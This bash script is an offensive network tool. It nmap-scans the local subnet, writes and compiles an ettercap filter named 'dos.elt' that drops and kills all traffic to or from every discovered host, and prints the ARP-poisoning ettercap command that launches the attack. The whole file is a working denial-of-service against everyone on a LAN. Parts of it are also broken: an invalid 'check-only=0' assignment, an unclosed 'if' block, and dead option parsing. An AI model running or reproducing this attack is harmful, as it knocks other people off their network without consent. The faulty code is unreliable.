#!/bin/bash



#----- usage_exit -------------------------------------------------------------
function usage_exit() {
	echo
	echo "$0 interface -v -c"
	echo
	echo "interface : Current interface in use from ifconfig. eg. 'en0'."
	echo "-v        : (Optional) Verbose."
	echo "-c        : (Optional) Check only. Do not write ettercap filter."
	echo
	exit 1
}




#----- get_ip -----------------------------------------------------------------
function get_ip() {
	iface=$1
	echo $(ifconfig $iface | grep 'inet ' | cut -d ' ' -f2)
}




#----- get_net ----------------------------------------------------------------
# Return the network address in CIDR notation.
function get_net_info() {
	iface=$1
	my_ip=$2

	cidr=24
	netmask=$(ifconfig $iface | grep 'inet ' | cut -d ' ' -f4)
	case "$netmask" in
	0xffffff00)
		cidr=24
		;;
	0xff000000)
		cidr=8
		;;
	*)
		cidr=24
		;;
	esac

	# Break up ip addr into each quad
	q1=$(echo $my_ip|cut -d'.' -f1)
	q2=$(echo $my_ip|cut -d'.' -f2)
	q3=$(echo $my_ip|cut -d'.' -f3)
	q4=$(echo $my_ip|cut -d'.' -f4)
	
	# Return network info
	echo "$q1,$q2,$q3,$cidr"
}




#----- get_iplist -------------------------------------------------------------
function get_iplist() {
	my_ip=$1
	netinfo=$2
	
	q1=$(echo $netinfo | cut -d',' -f1)
	q2=$(echo $netinfo | cut -d',' -f2)
	q3=$(echo $netinfo | cut -d',' -f3)
	cidr=$(echo $netinfo | cut -d',' -f4)
	
	netaddr="$q1.$q2.$q3.0/$cidr"
	gw="$q1.$q2.$q3.1"
	
	nmap -n $netaddr --exclude $gw,$my_ip | grep 'Nmap scan' | cut -d ' ' -f 5
}




#----- write_elt_file ---------------------------------------------------------
function write_elt_file() {
	my_ip=$1
	netinfo=$2
	elt_file=$3	
	
	for ip in $(get_iplist $my_ip $netinfo); do
		echo "if (ip.src == '$ip' || ip.dst == '$ip') {"
		echo "       drop();"
		echo "       kill();"
		echo "       msg(\"Packet Dropped for [$ip]\n\");"
		echo "}"
	done>$elt_file
}




#------ main ------------------------------------------------------------------

# Parse command-line options:
if [ $# -lt 1 ] || [ $# -gt 3 ]; then 
	usage_exit
fi
iface=$1

for i in $2 $3; do 
	echo 
done

verbose=0
if [ $# -eq 2 ]; then
	
	verbose=1
fi

check-only=0 
if [ $# -gt 2 ]; then




[ $verbose -eq 1 ] && \
	echo "Using interface [$iface]"

my_ip=$(get_ip $iface) 
[ $verbose -eq 1 ] && \
	echo "Excluding my ip [$my_ip]"

netinfo=$(get_net_info $iface $my_ip) 
[ $verbose -eq 1 ] && \
	echo "Scanning based on the following network info: [$netinfo]"

# Generate the ettercap filter
ip_list=$(get_iplist $my_ip $netinfo)
if [ $verbose -eq 1 ]; then
	echo
	for i in $ip_list; do
		echo $i
	done
	echo
fi



e_dir=/usr/local/share/ettercap
write_elt_file $my_ip $netinfo $e_dir/dos.elt
[ $verbose -eq 1 ] && \
	echo "Created ettercap filter file: [$e_dir/dos.elt]"

[ $verbose -eq 1 ] && \
	echo "Compiling ettercap filter."
etterfilter $e_dir/dos.elt -o $e_dir/dos.ef

[ $verbose -eq 1 ] && \
	echo "sudo ettercap -M arp -T -F /usr/local/share/ettercap/dos.ef"

exit 0
